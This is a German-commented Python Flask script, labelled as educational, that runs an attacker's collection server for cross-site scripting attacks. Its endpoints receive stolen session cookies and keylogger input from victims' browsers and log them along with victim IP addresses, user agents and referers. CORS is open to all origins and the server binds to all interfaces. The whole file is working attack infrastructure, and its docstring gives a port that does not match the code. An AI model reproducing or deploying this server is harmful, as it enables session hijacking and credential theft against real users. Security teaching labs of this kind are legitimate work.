#!/usr/bin/env python3
"""
ATTACKER SERVER - NUR FÜR BILDUNGSZWECKE
=========================================
Dieser Server läuft auf einem separaten Port (8888) und empfängt:
- Gestohlene Cookies
- Keylogger-Daten

USAGE:
    python attacker_server.py

Der Server läuft dann auf: http://127.0.0.1:9999
"""

from flask import Flask, request
from flask_cors import CORS
from datetime import datetime
import os

app = Flask(__name__)

# CORS aktivieren - erlaubt Cross-Origin Requests von der verwundbaren App
CORS(app, resources={r"/*": {"origins": "*"}})

# Dateien für Logging
COOKIE_LOG = "stolen_cookies.txt"
KEYLOG_FILE = "keylog.txt"

# Banner beim Start
BANNER = """
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║           🎯 ATTACKER SERVER GESTARTET 🎯               ║
║                                                          ║
║  Port: 9999                                              ║
║  Endpoints:                                              ║
║    • /steal_cookie  (GET/POST)                           ║
║    • /steal         (GET/POST) - Alias                   ║
║    • /log_keys      (POST)                               ║
║                                                          ║
║  ⚠️  NUR FÜR BILDUNGSZWECKE                              ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
"""

def log_to_file(filename, message):
    """Hilfsfunktion zum Schreiben in Logdateien"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(filename, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {message}\n")

def print_separator():
    """Druckt eine visuelle Trennlinie"""
    print("\n" + "="*70 + "\n")

@app.route("/")
def index():
    """Statusseite"""
    return """
    <h1>🎯 Attacker Server</h1>
    <p>Status: <span style="color:green">ONLINE</span></p>
    <h2>Verfügbare Endpoints:</h2>
    <ul>
        <li><code>/steal_cookie</code> - Empfängt gestohlene Cookies</li>
        <li><code>/steal</code> - Alias für /steal_cookie</li>
        <li><code>/log_keys</code> - Empfängt Keylogger-Daten</li>
    </ul>
    <p><strong>⚠️ NUR FÜR BILDUNGSZWECKE</strong></p>
    """, 200

@app.route("/steal_cookie", methods=["GET", "POST"])
def steal_cookie():
    """
    Endpoint zum Empfangen gestohlener Cookies
    Akzeptiert Cookie als GET-Parameter 'c' oder POST-Parameter 'c'
    """
    # Cookie aus GET oder POST holen
    cookie = request.args.get("c") or request.form.get("c", "")

    # Zusätzliche Informationen sammeln
    victim_ip = request.remote_addr
    user_agent = request.headers.get("User-Agent", "Unknown")
    referer = request.headers.get("Referer", "Unknown")

    if cookie:
        print_separator()
        print("🍪 COOKIE GESTOHLEN!")
        print("-" * 70)
        print(f"Zeitpunkt:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Opfer IP:    {victim_ip}")
        print(f"User-Agent:  {user_agent}")
        print(f"Referer:     {referer}")
        print(f"Cookie:      {cookie[:100]}..." if len(cookie) > 100 else f"Cookie:      {cookie}")
        print_separator()

        # In Datei loggen
        log_message = f"IP: {victim_ip} | Cookie: {cookie} | UA: {user_agent} | Ref: {referer}"
        log_to_file(COOKIE_LOG, log_message)

        return "", 200
    else:
        return "No cookie received", 400

@app.route("/steal", methods=["GET", "POST"])
def steal():
    """
    Alternativer Endpoint zum Empfangen gestohlener Cookies
    Kompatibel mit Payload-Format: /steal?c=...
    """
    # Cookie aus GET oder POST holen
    cookie = request.args.get("c") or request.form.get("c", "")

    # Zusätzliche Informationen sammeln
    victim_ip = request.remote_addr
    user_agent = request.headers.get("User-Agent", "Unknown")
    referer = request.headers.get("Referer", "Unknown")

    if cookie:
        print_separator()
        print("🍪 COOKIE GESTOHLEN!")
        print("-" * 70)
        print(f"Zeitpunkt:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Opfer IP:    {victim_ip}")
        print(f"User-Agent:  {user_agent}")
        print(f"Referer:     {referer}")
        print(f"Cookie:      {cookie[:100]}..." if len(cookie) > 100 else f"Cookie:      {cookie}")
        print_separator()

        # In Datei loggen
        log_message = f"IP: {victim_ip} | Cookie: {cookie} | UA: {user_agent} | Ref: {referer}"
        log_to_file(COOKIE_LOG, log_message)

        return "", 200
    else:
        return "No cookie received", 400

@app.route("/log_keys", methods=["POST"])
def log_keys():
    """
    Endpoint zum Empfangen von Keylogger-Daten
    Erwartet POST-Parameter 'keys'
    """
    keys = request.form.get("keys", "")
    victim_ip = request.remote_addr
    referer = request.headers.get("Referer", "Unknown")

    if keys:
        print(f"⌨️  KEYLOG [{datetime.now().strftime('%H:%M:%S')}] [{victim_ip}]: {keys}")

        # In Datei loggen
        log_message = f"IP: {victim_ip} | Keys: {keys} | Ref: {referer}"
        log_to_file(KEYLOG_FILE, log_message)

        return "", 200
    else:
        return "No keys received", 400

@app.route("/health")
def health():
    """Health-Check Endpoint"""
    return {"status": "ok", "server": "attacker"}, 200

@app.errorhandler(404)
def not_found(e):
    """404 Handler"""
    return "404 - Endpoint nicht gefunden", 404

if __name__ == "__main__":
    # Banner anzeigen
    print(BANNER)

    # Logdateien initialisieren
    if not os.path.exists(COOKIE_LOG):
        with open(COOKIE_LOG, "w") as f:
            f.write(f"# Cookie Log - Erstellt: {datetime.now()}\n")

    if not os.path.exists(KEYLOG_FILE):
        with open(KEYLOG_FILE, "w") as f:
            f.write(f"# Keylogger Log - Erstellt: {datetime.now()}\n")

    print("📝 Logdateien:")
    print(f"   • Cookies:   {os.path.abspath(COOKIE_LOG)}")
    print(f"   • Keylogs:   {os.path.abspath(KEYLOG_FILE)}")
    print("\n🚀 Server startet...\n")

    # Server auf Port 9999 starten
    # host='0.0.0.0' erlaubt Zugriff von anderen Geräten im Netzwerk
    app.run(
        debug=True,
        host='0.0.0.0',
        port=9999,
        threaded=True
    )
